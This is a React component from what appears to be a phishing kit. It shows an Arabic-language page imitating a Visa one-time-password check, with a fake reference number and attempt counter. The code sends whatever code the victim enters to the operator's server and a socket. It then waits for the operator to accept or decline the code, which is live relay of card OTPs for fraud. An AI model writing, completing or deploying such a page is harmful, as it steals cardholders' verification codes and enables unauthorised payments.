import React, { useEffect, useState } from "react";
import { api_route, socket } from "../App";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";
const VisaOtp = ({}) => {
  const [error, setError] = useState(null);
  const [otp, setOtp] = useState(null);
  const [counter, setCounter] = useState(60);
  const [load, setLoad] = useState(false);
  const [verfiy, setVrefiy] = useState(true);

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();
    console.log(otp);
    try {
      await axios.post(api_route + "/visaOtp/" + id, { otp }).then(() => {
        socket.emit("visaOtp", { id, visaOtp: otp });
      });
    } catch (error) {}
  };

  socket.on("acceptVisaOtp", (data) => {
    console.log(data);
    if (data === id) {
      return (window.location.href = "/visa");
    }
  });

  socket.on("declineVisaOtp", (data) => {
    console.log(data);
    if (data === id) {
      setError(true);
      setLoad(false);
    }
  });

  return (
    <div className="w-full flex flex-col justify-center items-center">
      <img src="/img4.png" />
      <div
        className="w-11/12 py-5 border rounded-lg flex flex-col bg-gray-100 "
        dir="rtl"
      >
        <div className=" font-bold text-gray-700 border-b px-5 border-gray-300 w-full pb-5 text-sm">
          التحقق لمرة واحدة
        </div>
        <span
          className="text-green-500 px-2 text-sm py-5  "
          style={{ lineHeight: "2rem" }}
        >
          تم إرسال رمز التحقق إلي رقم الهاتف المحمول المسجًل الخاص بك . الرجاء
          إدخال هذا الرمز أدناه لإتمام العملية{" "}
        </span>
        <form onSubmit={handleSubmit} className="flex flex-col w-11/12 px-3">
          <span>رمز التحقق</span>
          <input
            type="text"
            inputMode="numeric"
            max={6}
            maxLength={6}
            minLength={4}
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
            className="w-1/2 py-2 px-3 my-3 rounded-lg border-orange-300 border"
            required
          />
          <span className="bg-green-600 rounded-md px-5 py-3  text-xs w-fit text-white">
            {" "}
            تأكيد الرمز{" "}
          </span>
          <span className="py-1 pt-3 text-green-800">المحاولات المتبقية</span>
          <span>5</span>
          <span className="py-1 pt-2 text-green-800">الرقم المرجعي</span>
          <span className="border-y border-white">1584347421</span>
          <button
            type="submit"
            className="text-white flex items-center justify-center font-semibold bg-orange-400 rounded-xl py-2 w-full  my-3"
          >
            {load ? (
              <TailSpin
                height="30"
                width="30"
                color="white"
                ariaLabel="tail-spin-loading"
                radius="1"
                wrapperStyle={{}}
                wrapperClass=""
                visible={true}
              />
            ) : (
              "تأكيد"
            )}
          </button>
          {error && (
            <div className="w-full text-red-700 py-2 text-center">
              الرمز خطأ
            </div>
          )}
        </form>
      </div>

      <img src="/img5.avif" />
    </div>
  );
};

export default VisaOtp;

// <input className='md:w-1/2 w-2/3 outline-none  rounded-sm px-2 py-1 md:text-sm otp-desc text-center' style={{border:'1px solid #eee'}}  placeholder={`********`} required type='text' onChange={(e)=>setOtp(e.target.value.replace(/\D/g, ''))}  inputMode="numeric"   value={otp}/>

// if (network === "STC") {
//   return setVrefiy(true);
// } else {
// }
